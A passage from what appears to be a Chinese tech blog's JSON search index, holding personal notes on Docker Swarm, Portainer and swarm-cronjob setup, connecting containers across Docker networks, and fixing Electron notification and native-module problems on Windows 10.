title=\"docker node\"></a>docker node</h2><p>docker node ls</p>\n<p>可以看到所有加入的 node</p>\n<h2 id=\"docker-service\"><a href=\"#docker-service\" class=\"headerlink\" title=\"docker service\"></a>docker service</h2><p>docker service 簡單來說就像 docker run 的 swarm 版。</p>\n<p>只能在 manager 執行，會自動分配在 node 執行<br>docker service create –name=my_nginx nginx<br>docker service create –detach=false –name my_nginx –mode replicated nginx</p>\n<p>docker service update<br>docker service update –publish-add 80 my_nginx</p>\n<h3 id=\"scale\"><a href=\"#scale\" class=\"headerlink\" title=\"scale\"></a>scale</h3><p>docker service scale my_nginx=5</p>\n<h3 id=\"兩種模式\"><a href=\"#兩種模式\" class=\"headerlink\" title=\"兩種模式\"></a>兩種模式</h3><p>replicated:簡單說就是自動分配<br>global   :簡單說就是全部 node 都裝</p>\n<p>預設 replicated</p>\n<p><a href=\"https://note.qidong.name/2018/11/docker-swarm/\" target=\"_blank\" rel=\"noopener\">Docker Swarm概念与基本用法 · 零壹軒·笔记</a></p>\n<h3 id=\"關掉-service\"><a href=\"#關掉-service\" class=\"headerlink\" title=\"關掉 service\"></a>關掉 service</h3><p>docker dervice scale my_xxx=0</p>\n<p>docker service rm  my_xxx</p>\n<h3 id=\"docker-查看\"><a href=\"#docker-查看\" class=\"headerlink\" title=\"docker 查看\"></a>docker 查看</h3><p>docker service ps</p>\n<h3 id=\"查看日誌\"><a href=\"#查看日誌\" class=\"headerlink\" title=\"查看日誌\"></a>查看日誌</h3><p>docker service log</p>\n<h2 id=\"docker-stack\"><a href=\"#docker-stack\" class=\"headerlink\" title=\"docker stack\"></a>docker stack</h2><p>簡單來說， docker stack 就是 docker compose 的 swarm 版本。</p>\n<p>docker stack deploy –compose-file=portainer-agent-stack.yml portainer</p>\n<h2 id=\"portainer\"><a href=\"#portainer\" class=\"headerlink\" title=\"portainer\"></a>portainer</h2><p>在使用 portainer 新增機器(endpoint)<br>會有 agent 跟 docker<br>選擇 docker ，由於 docker swarm 是叢集，所以部份建立 container 要去不同 endpint (node) 看東西</p>\n<p>使用 agent 同一台 endpoint 就能看到全部</p>\n<img src=\"/blog/2019/12/07/docker-swarm-一些指令相關整理/img1.png\" title=\"agent和docker\">\n<p>不過哪個比較好，我還沒有確定，我們公司是用 docker</p>\n<p>設定 agent 沒有很順利，後來用完在此紀錄</p>\n<h3 id=\"agent\"><a href=\"#agent\" class=\"headerlink\" title=\"agent\"></a>agent</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ curl -L https://downloads.portainer.io/portainer-agent-stack.yml -o portainer-agent-stack.yml</span><br><span class=\"line\">$ docker stack deploy --compose-file=portainer-agent-stack.yml portainer</span><br></pre></td></tr></table></figure>\n<p>官網設定會有很大問題，後來發現只要是 portainer 用 stack 部屬就會有問題(卡在一開始 Load 登入頁面)<br>不過單獨使用 portainer container 就沒這個問題</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#docker run -d -p 9000:9000 -p 8000:8000 --name portainer --restart always -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer</span></span><br><span class=\"line\"><span class=\"comment\"># 可使用 docker swarm 注意 我把 volume 拿掉了</span></span><br><span class=\"line\">docker service create \\</span><br><span class=\"line\">    --name portainer \\</span><br><span class=\"line\">    --publish 9000:9000 \\</span><br><span class=\"line\">    --publish 8000:8000 \\</span><br><span class=\"line\">    --replicas=1 \\</span><br><span class=\"line\">    --constraint <span class=\"string\">'node.role == manager'</span> \\</span><br><span class=\"line\"><span class=\"comment\">#    --mount type=bind,src=//path/on/host/data,dst=/data \\    ##測試用，所以這個拿掉</span></span><br><span class=\"line\">    portainer/portainer</span><br><span class=\"line\"></span><br><span class=\"line\">curl -L https://downloads.portainer.io/agent-stack.yml -o agent-stack.yml &amp;&amp; docker stack deploy --compose-file=agent-stack.yml portainer-agent</span><br></pre></td></tr></table></figure>\n<p>在隨便加入一個到 endpoint 就可以了<br>至於官方的不知道為什麼不能用?<br>目前找不到方法…(我是在 play with docker 跑的)<br>也有可能跟環境問題</p>\n<h3 id=\"agent-跟-docker-差異\"><a href=\"#agent-跟-docker-差異\" class=\"headerlink\" title=\"agent 跟 docker 差異\"></a>agent 跟 docker 差異</h3><img src=\"/blog/2019/12/07/docker-swarm-一些指令相關整理/img2.png\" title=\"agent與docker差異\">\n<p>192.168.1.17 有兩個，有一個是 agent 跟 docker<br>你會發現 agent 跟別的 agent 數量是一樣的<br>照道理可能加一個 agent 就可以了</p>\n<p><a href=\"https://www.kubernetes.org.cn/5883.html\" target=\"_blank\" rel=\"noopener\">Portainer一个轻量级的Docker环境管理UI_Kubernetes中文社区</a><br><a href=\"https://yylin1.github.io/2019/01/28/portainer-set-tls/\" target=\"_blank\" rel=\"noopener\">Portainer 透過 TLS 認證 - Yi Yang’s Blog</a></p>\n<h2 id=\"使用-play-with-docker\"><a href=\"#使用-play-with-docker\" class=\"headerlink\" title=\"使用 play with docker\"></a>使用 play with docker</h2><p>做 manager 和 worker 有預設三個 template<br>我後來發現不是每一個 template 都有幫你做 swarm join<br>所以建議良好習慣使用 <code>docker node ls</code> 查看有哪些加入</p>\n<h2 id=\"history\"><a href=\"#history\" class=\"headerlink\" title=\"history\"></a>history</h2><p>預設是 5 個</p>\n<p><a href=\"https://stackoverflow.com/questions/42364695/how-to-clear-docker-task-history\" target=\"_blank\" rel=\"noopener\">linux - How to clear Docker task history - Stack Overflow</a></p>\n<p>docker swarm update –task-history-limit 5 </p>\n<h2 id=\"使用-swarm-volume-可能問題\"><a href=\"#使用-swarm-volume-可能問題\" class=\"headerlink\" title=\"使用 swarm volume 可能問題\"></a>使用 swarm volume 可能問題</h2><p>有時間研究再記錄</p>\n<p><a href=\"https://www.cnblogs.com/bigberg/p/8795265.html\" target=\"_blank\" rel=\"noopener\">Docker集群管理Swarm数据持久化 - Bigberg - 博客园</a><br><a href=\"https://blog.51cto.com/ganbing/2091292\" target=\"_blank\" rel=\"noopener\">“三剑客”之Swarm应用数据持久化管理（volume 、bind 、 nfs）-DevOps(甘兵)-51CTO博客</a></p>\n<h2 id=\"swarm-conjob\"><a href=\"#swarm-conjob\" class=\"headerlink\" title=\"swarm conjob\"></a>swarm conjob</h2><p>聽說 swarm 可以設定排程<br>我搜尋一下完全沒有看到<br>看到介紹有 schedule ，我以為內建應該會有排程東西，不過我猜這個跟 docker service 可能有關係<br>不過最後還是找到 <a href=\"https://github.com/crazy-max/swarm-cronjob\" target=\"_blank\" rel=\"noopener\">crazy-max/swarm-cronjob: 📅 Create jobs on a time-based schedule on Docker 🐳 Swarm</a><br>好像新增 label 就能設定排程</p>\n<p>不過有看到類似看到每月最後一天執行程式<br>看到有人建議用 每月第一天<br>之前有寫過這篇解決<a href=\"https://malagege.github.io/blog/2019/08/04/%E6%8E%92%E7%A8%8B-crontab-%E6%99%82%E9%96%93%E8%A8%AD%E5%AE%9A%E6%9C%88%E5%BA%95%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/\">排程 crontab 時間設定月底執行方法 | 程式狂想筆記</a><br>由於我公司的主機用UTC時間，但設定跟程式排程不是UTC時間<br>所以必須使用這個方式完成</p>\n<p><del>有空在補這個</del></p>\n<p><strong>2019-12-09</strong></p>\n<p>今天嘗試了一夏swarm-job<br>架設上非常方便<br>但有幾點要特別注意</p>\n<h3 id=\"安裝-swarm-cronjob\"><a href=\"#安裝-swarm-cronjob\" class=\"headerlink\" title=\"安裝 swarm-cronjob\"></a>安裝 swarm-cronjob</h3><p>可以用 play wtih docker 測試，開 template 3 個 manager 2 個 worker<br>方法跟上面一樣<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker service create \\</span><br><span class=\"line\">    --name portainer \\</span><br><span class=\"line\">    --publish 9000:9000 \\</span><br><span class=\"line\">    --publish 8000:8000 \\</span><br><span class=\"line\">    --replicas=1 \\</span><br><span class=\"line\">    --constraint <span class=\"string\">'node.role == manager'</span> \\</span><br><span class=\"line\">    portainer/portainer</span><br><span class=\"line\"></span><br><span class=\"line\">curl -L https://downloads.portainer.io/agent-stack.yml -o agent-stack.yml &amp;&amp; docker stack deploy --compose-file=agent-stack.yml portainer-agent</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">## 安裝 swarm-cronjob</span></span><br><span class=\"line\">docker service create --name swarm_cronjob \\</span><br><span class=\"line\">  --mount <span class=\"built_in\">type</span>=<span class=\"built_in\">bind</span>,<span class=\"built_in\">source</span>=/var/run/docker.sock,target=/var/run/docker.sock \\</span><br><span class=\"line\">  --env <span class=\"string\">\"LOG_LEVEL=info\"</span> \\</span><br><span class=\"line\">  --env <span class=\"string\">\"LOG_JSON=false\"</span> \\</span><br><span class=\"line\">  --constraint <span class=\"string\">\"node.role == manager\"</span> \\</span><br><span class=\"line\">  crazymax/swarm-cronjob</span><br></pre></td></tr></table></figure></p>\n<p>其他更多方式看官方文件</p>\n<h3 id=\"執行注意\"><a href=\"#執行注意\" class=\"headerlink\" title=\"執行注意\"></a>執行注意</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Set command to run the task command 需要下 command </span><br><span class=\"line\">Set mode to replicated (default)  使用 replicated mode</span><br><span class=\"line\">Set replicas to 0 to avoid running task as soon as the service is deployed  一開始設定replicas=0，否則會議開始就會跑</span><br><span class=\"line\">Set restart_policy.condition to none. This is needed for a cronjob, otherwise the task will restart automatically restart_policy 請設定 none ，否則一開始會一直執行</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker service create --name=my_hello --replicas=0 --restart-condition=none --label  swarm.cronjob.enable=&quot;true&quot; --label swarm.cronjob.schedule=&quot;*/2 * * * *&quot; hello-world ./hello</span><br></pre></td></tr></table></figure>\n<p>官方可以帶的 label，前面兩個是必帶<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">swarm.cronjob.enable : Set to true to enable the cronjob (required)</span><br><span class=\"line\">swarm.cronjob.schedule : CRON expression format to use. (required)</span><br><span class=\"line\">swarm.cronjob.skip-running : Do not start a job if the service is currently running (optional)</span><br><span class=\"line\">swarm.cronjob.replicas : Number of replicas to set on schedule in replicated mode. (optional, default 1)</span><br></pre></td></tr></table></figure></p>\n<p>有空再放 stack yml</p>\n<h3 id=\"agent-mode-global\"><a href=\"#agent-mode-global\" class=\"headerlink\" title=\"agent mode global\"></a>agent mode global</h3><p>我發現我只要新增 node 加入 swarm，就會自動安裝 agent<br>portainer 什麼設定都不用做!!!!太猛啦</p>\n<h2 id=\"相關連結\"><a href=\"#相關連結\" class=\"headerlink\" title=\"相關連結\"></a>相關連結</h2><p>加入最愛的連結，但我沒整理，我就放一些彩蛋吧XD</p>\n<ul>\n<li><a href=\"https://ithelp.ithome.com.tw/articles/10196261\" target=\"_blank\" rel=\"noopener\">[Day 19] 在 Kubernetes 中實現負載平衡 - Ingress Controller - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></li>\n<li><a href=\"https://objcoding.com/2018/09/03/docker-stack/\" target=\"_blank\" rel=\"noopener\">Docker Stack多服务编排</a></li>\n<li><a href=\"https://super9.space/archives/1653\" target=\"_blank\" rel=\"noopener\">Docker Swarm 進階實戰 (1) - Super9</a></li>\n<li><a href=\"https://blog.toright.com/posts/5598/%E7%94%A8-docker-swarm-%E9%83%A8%E7%BD%B2%E4%BD%A0%E7%9A%84%E9%9B%B2%E6%9C%8D%E5%8B%99-%E5%AF%A6%E4%BD%9C%E7%AF%87.html\" target=\"_blank\" rel=\"noopener\">用 Docker Swarm 部署你的雲服務 (實作篇) - Soul &amp; Shell Blog</a></li>\n<li><a href=\"https://tingsyuanwang.github.io/blogs/2017/08/01/docker-%E5%BF%AB%E9%80%9F%E5%AD%B8%E7%BF%92%E8%87%AA%E6%88%91%E6%8C%91%E6%88%B0-Day7/\" target=\"_blank\" rel=\"noopener\">docker 快速學習自我挑戰 Day7 | Vincent’s Corner</a></li>\n<li><a href=\"https://blog.tiger-workshop.com/docker-notes-how-to-run-compose-swarm-mode/\" target=\"_blank\" rel=\"noopener\">[Docker 學習筆記] Run/Compose/Swarm Mode 幾個運行方式基本概念 – Tiger-Workshop Blog</a></li>\n<li><a href=\"https://www.cnblogs.com/Java3y/p/11982381.html\" target=\"_blank\" rel=\"noopener\">全网最通俗易懂的Kafka入门！ - Java3y - 博客园</a></li>\n<li><a href=\"https://www.cnblogs.com/bigberg/p/8795265.html\" target=\"_blank\" rel=\"noopener\">Docker集群管理Swarm数据持久化 - Bigberg - 博客园</a></li>\n<li><a href=\"https://www.itread01.com/content/1547272631.html\" target=\"_blank\" rel=\"noopener\">Docker Swarm叢集實踐——部署篇 - IT閱讀</a></li>\n<li><a href=\"https://www.hkposts.com/55989/apache%E7%9A%84%E4%B8%89%E7%A8%AE%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%EF%BC%88prefork-worker-event%EF%BC%89/\" target=\"_blank\" rel=\"noopener\">Apache的三種工作模式（prefork/worker/Event）</a></li>\n<li><a href=\"https://collabnix.com/running-cron-jobs-container-on-5-node-docker-swarm-mode-cluster/\" target=\"_blank\" rel=\"noopener\">Running Cron Jobs container on 5-Node Docker Swarm Mode Cluster – Collabnix</a></li>\n<li><a href=\"https://www.itread01.com/content/1548180022.html\" target=\"_blank\" rel=\"noopener\">docker叢集管理工具–Swarm以及Portainer安裝 - IT閱讀</a></li>\n<li><a href=\"https://github.com/robfig/cron/issues/234\" target=\"_blank\" rel=\"noopener\">How to set the last day of the month? · Issue #234 · robfig/cron</a></li>\n<li><a href=\"https://www.kubernetes.org.cn/5883.html\" target=\"_blank\" rel=\"noopener\">Portainer一个轻量级的Docker环境管理UI_Kubernetes中文社区</a></li>\n<li><a href=\"https://blog.coding.net/blog/Haproxy&amp;Keepalived\" target=\"_blank\" rel=\"noopener\">使用 Haproxy + Keepalived 构建基于 Docker 的高可用负载均衡服务（一） - CODING 博客</a></li>\n<li><a href=\"https://blog.51cto.com/dengaosky/2129856\" target=\"_blank\" rel=\"noopener\">Haproxy+Keepalived高可用环境部署梳理（主主和主从模式）-眼眸刻着你的微笑-51CTO博客</a></li>\n<li><a href=\"https://stackoverflow.com/questions/41705134/how-can-i-remove-shutdown-docker-service-tasks-after-a-rolling-update\" target=\"_blank\" rel=\"noopener\">containers - How can I remove shutdown Docker Service tasks after a rolling update? - Stack Overflow</a></li>\n<li><a href=\"https://blog.rj-bai.com/post/150.html\" target=\"_blank\" rel=\"noopener\">Docker Swarm 实战 - rj-bai ‘s Blog</a></li>\n</ul>\n<h2 id=\"針對-CPU-架構選擇-image\"><a href=\"#針對-CPU-架構選擇-image\" class=\"headerlink\" title=\"針對 CPU 架構選擇 image\"></a>針對 CPU 架構選擇 image</h2><ol>\n<li>docker pull [OPTIONS] NAME[:TAG|@DIGEST]</li>\n</ol>\n<p>如：<br>docker pull ubuntu@sha256:45b23dee08af5e43a7fea6c4cf9c25ccf269ee113168c19722f8787</p>\n<ol start=\"2\">\n<li>// 通过如下命令指定arch:<br>docker run -it –rm <image-name>:<tag>  arch=linux/arm64</tag></image-name></li>\n</ol>\n<p>方法三就不寫了，看起來很麻煩</p>\n<p>參考:<a href=\"https://blog.csdn.net/u010918487/article/details/107067224\" target=\"_blank\" rel=\"noopener\">docker pull 指定 os/arch_Yu的博客-CSDN博客</a></p>\n","categories":["Docker"],"tags":["docker","swarm"]},{"title":"docker嘗試著把兩個不同network container做連線動作","url":"/blog/2019/01/06/docker%E5%98%97%E8%A9%A6%E8%91%97%E6%8A%8A%E5%85%A9%E5%80%8B%E4%B8%8D%E5%90%8Cnetwork-container%E5%81%9A%E9%80%A3%E7%B7%9A%E5%8B%95%E4%BD%9C/","content":"<p>之前讀到 load balance 都沒有看到如何做 DB 處理<br>不可能各區域都有一個 DB 吧<br>不過之前有跟人聊過<br>在部屬程式的時候，做 load balance 在每一個分流 IP 設定可以設一樣東西<br>不過內部 DB 要怎麼共用呢? 不過聽說可以設定讓他們導向一樣的地方<br>講那麼多有點離題，因為這篇也不是做 load balance</p>\n<p>docker 在不同專案 說不定也會用到共用 DB<br>今天是自己實驗小記<br>可能不會記錄很詳細<br>畢竟 docker network 我還是很不熟</p>\n<a id=\"more\"></a>\n<p>今天找了相關 docker network 東西<br>但還不是很了解，有找了幾篇文章</p>\n<ul>\n<li><a href=\"https://blog.waterstrong.me/docker-networking/\" target=\"_blank\" rel=\"noopener\">Docker 学习与实践 - 网络篇 - Waterstrong</a></li>\n<li><a href=\"https://www.slideshare.net/philipzh/docker-78924025\" target=\"_blank\" rel=\"noopener\">Docker 進階實務班</a></li>\n<li><a href=\"https://javatoybox.blogspot.com/2018/10/docker-network-docker-compose.html\" target=\"_blank\" rel=\"noopener\">放棄思考: Docker Network 及 Docker Compose 教學</a></li>\n</ul>\n<p>首先，我實作兩個 network 出來<br>想辦法讓他們的 container 可以相連</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker network create test_1</span><br><span class=\"line\">docker network create test_2</span><br><span class=\"line\">docker run --name some-mysql1 -e MYSQL_ROOT_PASSWORD=root -d --network=test_1 mysql --default-authentication-plugin=mysql_native_password</span><br><span class=\"line\">docker run --name some-mysql2 -e MYSQL_ROOT_PASSWORD=root -d --network=test_2 mysql --default-authentication-plugin=mysql_native_password</span><br><span class=\"line\">docker run --name adminer --network=test_1 -d -p  8080:8080 adminer</span><br><span class=\"line\">docker network connect test_2 adminer</span><br></pre></td></tr></table></figure>\n<p>主要最後重點<br>docker network connect <code>network_name</code> <code>container_name</code><br>可以讓你的 container 連線</p>\n<p>奇怪，docker run –network 只能塞一個 network_name<br>好像只透過 docker connect 才能做連結<br>不過 docker-compose 好像能設定兩個 network<br>感覺 docker network 也是一個大坑洞<br>之後有時間研究在筆記一下</p>\n<p>之前聽到 k8s 可以做到 docker 監控，順便做重啟動作<br>剛好最近看到這個影片有介紹<br><a href=\"https://www.youtube.com/watch?v=wnKyJKqKiVE\" target=\"_blank\" rel=\"noopener\">COSS 103 kubernetes 介紹 教學 指令操作 - YouTube</a><br>感覺還滿好用的東西<br>有空來研究看看<br>不過我覺得 docker 先搞熟再說</p>\n<h2 id=\"MySQL-8-0-的雷\"><a href=\"#MySQL-8-0-的雷\" class=\"headerlink\" title=\"MySQL 8.0 的雷\"></a>MySQL 8.0 的雷</h2><p>想說嘗試著用 docker 跑 mysql<br>adminer 一直登不進去<br>後來仔細看了一下 docker hub 的 pwd 有多<code>--default-authentication-plugin=mysql_native_password</code><br>WTF…</p>\n<blockquote>\n<p>因為 之前 MySQL 預設儲存密碼的方式是 mysql_native_password, 但 8.0 之後 預設的儲存方式為 caching_sha2_password, 說是又快又安全啦, 但讓人措手不及, 一堆 SQL 工具 (Navicat) 可能還來不及更新支援 就…</p>\n</blockquote>\n<p>ORZ…</p>\n<p><a href=\"http://samchu.logdown.com/posts/7425945-mysql8-authentication-plugin-change\" target=\"_blank\" rel=\"noopener\">MySQL8 Authentication plugin Change « Sam 的程式筆記</a><br><a href=\"http://php.net/manual/en/mysqli.requirements.php\" target=\"_blank\" rel=\"noopener\">PHP: Requirements - Manual</a></p>\n","categories":["Docker"],"tags":["docker"]},{"title":"electron Notification win 10 失敗小記","url":"/blog/2018/09/30/electron-Notification-win-10-%E5%A4%B1%E6%95%97%E5%B0%8F%E8%A8%98/","content":"<p>執行失敗，要算在復仇名單?<br>還是放棄orz</p>\n<a id=\"more\"></a>\n<p><a href=\"https://stackoverrun.com/cn/q/12037330\" target=\"_blank\" rel=\"noopener\">node-notifier - 节点通知模块的问题</a><br>查到好像跟node-notifier有關係<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">SnoreToast.exe -p C：\\Projects\\testSnoreToast\\coulson.png -m Hello -t World -s Notification.Default -appID</span><br></pre></td></tr></table></figure></p>\n<p>貼到win10 cmd不能跑<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">SnoreToast.exe -m Hello -t World</span><br></pre></td></tr></table></figure></p>\n<p>就會正常看到通知了</p>\n<p>我測試我寫的vue-electron 竟然不能跑node-notifier<br>但網路上有找到<br><a href=\"https://github.com/explooosion/electron-alarm-clock\" target=\"_blank\" rel=\"noopener\">explooosion/electron-alarm-clock: Sample apps for Electron</a><br>抓下來可以正常執行…(electron 2.0~3.0也試過，範例都能跑，看來跟版本無關)</p>\n<p>目前懷疑是vue cli 3 electron環境執行node-notifier會有問題<br>不過…嘗試著N方法也不行<br>electron 2.0~3.0都試過了…</p>\n<p>例如加上<br><code>app.setAppUserModelId(&quot;com.electron.test1&quot;);</code><br>也許要用甚麼註冊AppUserModelId才能跑?</p>\n<p>ID好像有命名規則<br>CompanyName.ProductName.SubProduct.VersionInformation</p>\n<p>但還是不行 orz<br>網路資源不多</p>\n<p>Linux試過都正常，win10不知道為什麼那麼難搞<br>目前感覺原生electron 的Tray跟Notification  都在Win10失效了QQ</p>\n","categories":["JavaScruot"],"tags":["javascript","electron","notification"]},{"title":"electron win 10設定通知(AppUserModelId)&electron-builder相關NSIS設定","url":"/blog/2018/10/01/electron-win-10%E8%A8%AD%E5%AE%9A%E9%80%9A%E7%9F%A5-AppUserMOdelId-electron-builder%E7%9B%B8%E9%97%9C%E8%A8%AD%E5%AE%9A/","content":"<p>解決上一篇遇到win10通知沒法出來<br><a href=\"https://malagege.github.io/blog/2018/09/30/electron-Notification-win-10-%E5%A4%B1%E6%95%97%E5%B0%8F%E8%A8%98/\">electron Notification win 10 失敗小記 | 程式狂想筆記</a><br>最後仔細看了官方文件<br>才解決…..</p>\n<a id=\"more\"></a>\n<p>首先，win8 之後應用程式做通知都需要註冊<code>AppModelUserId</code><br>在dev時候很難註冊到(沒有方法)<br>在查詢一堆資料(NSIS….)<br>發現需要做安裝動作<br>才能註冊<code>AppModelUserId</code></p>\n<p>node-notifier是透過SnoreToast.exe程式呼叫<br>所以其實也可以不用安裝這個</p>\n<p>首先來看官方AppUserModelId設定<br>檔案請設定package.json(不是設定electron_dist裡面的)<br><figure class=\"highlight\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    ...,(第一階層)</span><br><span class=\"line\">    \"build\": &#123;</span><br><span class=\"line\">    \"appId\": \"com.example.app\"</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>但可以注意到<a href=\"https://www.electron.build/configuration/configuration#configuration\" target=\"_blank\" rel=\"noopener\">Common Configuration - electron-builder</a><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Configuration¶</span><br><span class=\"line\"></span><br><span class=\"line\">    appId = com.electron.$&#123;name&#125; String - The application id. Used as CFBundleIdentifier for MacOS and as Application User Model ID for Windows (NSIS target only, Squirrel.Windows not supported). It is strongly recommended that an explicit ID is set.</span><br><span class=\"line\">    productName String - As name, but allows you to specify a product name for your executable which contains spaces and other special characters not allowed in the name property.</span><br><span class=\"line\">    copyright = Copyright © year $&#123;author&#125; String - The human-readable copyright line for the app.</span><br></pre></td></tr></table></figure></p>\n<p>appId預設有設定<br>所以其實用預設可以不用再package.json設定</p>\n<p>最後起在background.js裡面加入<code>app.setUserModelId(&quot;com.electron.exampleName&quot;)</code>，最後exampleName改成package.json專案名子(name)</p>\n<p>之後安裝，執行程式可以看到通知結果</p>\n<p>NOTE: 通知安裝完，不會馬上在控制台看到程式設定<br>要第一次通知才能看到<br><img src=\"/blog/2018/10/01/electron-win-10設定通知-AppUserMOdelId-electron-builder相關設定/1.png\" title=\"Win10控制通知設定\"></p>\n<h2 id=\"NSIS-取消一件安裝、設定安裝路徑\"><a href=\"#NSIS-取消一件安裝、設定安裝路徑\" class=\"headerlink\" title=\"NSIS  取消一件安裝、設定安裝路徑\"></a>NSIS  取消一件安裝、設定安裝路徑</h2><figure class=\"highlight\"><table><tr><td class=\"code\"><pre><span class=\"line\">...,</span><br><span class=\"line\">\"build\":&#123;</span><br><span class=\"line\">  \"nsis\":&#123;</span><br><span class=\"line\">    \"oneClick\" : false,</span><br><span class=\"line\">    \"allowToChangeInstallationDirectory\": true</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>oneClick是否為一鍵安裝<br>allowToChangeInstallationDirectory是否讓User改安裝目錄</p>\n<p>更多設定我就不寫了<br><a href=\"https://www.electron.build/configuration/configuration#configuration\" target=\"_blank\" rel=\"noopener\">Common Configuration - electron-builder</a></p>\n<p>未來有空可以研究更新<br>不過目前這個用不到<br>先留者記錄<br><a href=\"https://segmentfault.com/a/1190000012904543\" target=\"_blank\" rel=\"noopener\">Electron应用使用electron-builder配合electron-updater实现自动更新 - 个人文章 - SegmentFault 思否</a></p>\n","categories":["JavaScript"],"tags":["electron","notification"]},{"title":"electron不會重覆開啟程式","url":"/blog/2018/10/20/electron%E4%B8%8D%E6%9C%83%E9%87%8D%E8%A6%86%E9%96%8B%E5%95%9F%E7%A8%8B%E5%BC%8F/","content":"<p>最近爬到能electron不會重新開啟程式方法<br>筆記筆記</p>\n<a id=\"more\"></a>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 點擊圖標(桌面快捷方式)檢查當前活動實例的個數</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> isSecondInstance = app.makeSingleInstance(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (mainWindow) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (mainWindow.isMinimized()) &#123;</span><br><span class=\"line\">      mainWindow.restore(); <span class=\"comment\">// 窗口從最小化恢復時觸發</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    mainWindow.show();</span><br><span class=\"line\">    <span class=\"comment\">// mainWindow.maximize();</span></span><br><span class=\"line\">    mainWindow.focus();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (isSecondInstance) &#123;</span><br><span class=\"line\">  app.quit();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>參考<a href=\"https://www.smwenku.com/a/5b82232d2b717737e032a0d9/\" target=\"_blank\" rel=\"noopener\">使用 electron-vue 搭建桌面應用開發模板 - 神馬文庫</a><br><a href=\"/blog/2018/10/20/electron不會重覆開啟程式/1.png\" title=\"備份圖\">備份圖</a></p>\n","categories":["JavaScript"],"tags":["electron"]},{"title":"electron使用winapi筆記","url":"/blog/2018/10/19/electron%E4%BD%BF%E7%94%A8winapi%E7%AD%86%E8%A8%98/","content":"<p>最近做一個蕃茄鐘，但是常常忘記點<code>開始時間</code>導致甚麼沒有用到<br>爬文有查到winapi可以抓到閒置時間<br>於是看electron是否能串接winapi資訊<br>就踩到很多個雷</p>\n<a id=\"more\"></a>\n<p>首先，<a href=\"https://www.npmjs.com/package/winapi\" target=\"_blank\" rel=\"noopener\">winapi - npm</a><br><code>require(&#39;winapi&#39;).GetLastInputInfo</code>這個可以爬到我們要的功能<br>以為會非常簡單，但是安裝卻不順利</p>\n<p>之前有爬到網頁講解node-gyp跟gyp介紹，但現在找不到<br>但有找到有簡單介紹</p>\n<blockquote>\n<p>node-gyp</p>\n<p>这货是 Node.js 中编译原生模块用的。自从 Node.js v0.8 之后，它就跟 Node.js 黏上了，在此之前它的默认编译帮助包是 node-waf[^3]，对于老 Noder 来说应该不会陌生的。<br>GYP</p>\n</blockquote>\n<blockquote>\n<p>node-gyp 是基于 GYP[^4] 的。它会识别包或者项目中的 binding.gyp[^5] 文件，然后根据该配置文件生成各系统下能进行编译的项目，如 Windows 下生成 Visual Studio 项目文件（<em>.sln 等），Unix 下生成 Makefile。在生成这些项目文件之后，node-gyp 还能调用各系统的编译工具（如 GCC）来将项目进行编译，得到最后的动态链接库 </em>.node 文件。</p>\n</blockquote>\n<p>參考網址:<a href=\"https://xcoder.in/2017/07/01/nodejs-addon-history/\" target=\"_blank\" rel=\"noopener\">从暴力到 NAN 再到 NAPI——Node.js 原生模块开发方式变迁 · 一个伪宅级别的码畜。</a></p>\n<p>以為簡單安裝<code>node-gyp</code>就能搞定…，但其實要安裝VSSTUDIO C++跟 python2<br>注意電腦有裝3的要讓預設變成2<br>安裝環境建議到VM玩<br>不然電腦會裝有的沒的東西<br>我就選擇在VM Win7環境做編譯</p>\n<p>簡單記錄安裝<code>node-gyp</code>兩個方法</p>\n<ol>\n<li><p><code>npm install --global --production windows-build-tools</code></p>\n</li>\n<li><p>我發現新版版本自帶安裝選項，不過會裝更多有的沒的東西orz</p>\n<img src=\"/blog/2018/10/19/electron使用winapi筆記/1.png\" title=\"npm run serve:electron\">\n</li>\n</ol>\n<p>當我以為要成功的時候，但竟然跑出這個東西</p>\n<img src=\"/blog/2018/10/19/electron使用winapi筆記/3.png\" title=\"npm run serve:electron\">\n<p>找到解決方法<br>以下兩個步驟</p>\n<ol>\n<li><p><code>npm run build:electron</code>會產生 winapi_win32_64_electron.node</p>\n</li>\n<li><p>修改node_module底下winapi的index.js程式<br>這個是我依照錯誤去找的<br>沒想到改成electron就能跑XD</p>\n<img src=\"/blog/2018/10/19/electron使用winapi筆記/4.png\" title=\"npm run serve:electron\">\n<img src=\"/blog/2018/10/19/electron使用winapi筆記/2.png\" title=\"npm run 